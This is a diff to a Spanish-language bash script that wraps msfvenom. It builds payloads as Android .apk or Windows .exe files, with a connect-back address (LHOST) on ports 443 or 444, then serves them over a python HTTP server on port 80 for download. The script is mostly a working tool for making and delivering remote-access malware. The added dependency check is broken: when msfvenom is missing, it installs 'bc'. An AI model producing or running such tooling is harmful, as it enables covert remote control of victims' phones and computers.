@@ -2,7 +2,7 @@
 opciones=0
 menu(){
 echo "1. android"
-echo "2.windows"
+echo "2. windows"
 }
 android(){ 
 echo -e "\e[0;34mPARA UTILIZAR MI SCRIPT
@@ -14,6 +14,13 @@ A la hora de buscar los payloads en la parte derecha podrás ver para que sirve 
 Una vez se ejecute el comando para crear tu archivo .apk se lanzará un
  servidor http y simplemente tendrás que poner tu ip en un navegador como
  duckduckgo y podrás acceder a tus archivos\e[0"
+echo "voy a comprobar una cosa"
+if command -v msfvenom &> /dev/null; then 
+echo "continuemos"
+else 
+sudo apt-get update > /dev/null && sudo apt-get install bc -y > /dev/null && echo "continuemos"
+fi
+sleep 1
 echo -e "\e[1;31mque payload quieres buscar, android\e[0m"
 read payl
 payl=$payl
@@ -28,9 +35,16 @@ ip=$ip
 nombre=$nombre
 pay=$pay
 
-msfvenom -p $pay LHOST=$ip LPORT=443 -o $nombre.apk && python3 -m http.server 80 || echo -e "\e[0;32mparece q>
+msfvenom -p $pay LHOST=$ip LPORT=443 -o $nombre.apk && python3 -m http.server 80 || echo "creo que hay algun problema"
 }
- windows(){
+windows(){
+if command -v msfvenom &> /dev/null; then 
+echo "continuemos"
+else 
+sudo apt-get update > /dev/null && sudo apt-get install bc -y > /dev/null && echo "error"
+fi
+sleep 1
+
 echo "que payload quiers buscar, windows"
 read payload
 payload=$payload
@@ -44,7 +58,7 @@ read nom
 pay=$pay
 ip=$ip
 nom=$nom
-msfvenom -p $pay LHOST=$ip LPORT=444 -f exe -o $nom.exe && python3 -m http.server 80 || echo "creo que hay al>
+msfvenom -p $pay LHOST=$ip LPORT=444 -f exe -o $nom.exe && python3 -m http.server 80 || echo "creo que hay algun problema"
 }
 while true; do
 menu
@@ -57,3 +71,4 @@ case $pay in
 *) echo "creo que algo no coincide" ;;
 esac 
 done
+
